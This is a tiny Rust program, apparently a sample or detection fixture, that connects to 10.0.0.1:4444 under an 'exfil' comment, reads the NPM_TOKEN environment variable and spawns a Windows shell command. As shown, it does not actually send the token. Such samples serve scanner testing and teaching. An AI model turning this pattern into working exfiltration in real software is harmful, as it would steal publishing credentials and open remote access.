use std::env;
use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("10.0.0.1:4444") { /* exfil */ }
    let _v = env::var("NPM_TOKEN").unwrap_or_default();
    Command::new("cmd").arg("/c").arg("dir").spawn().ok();
}
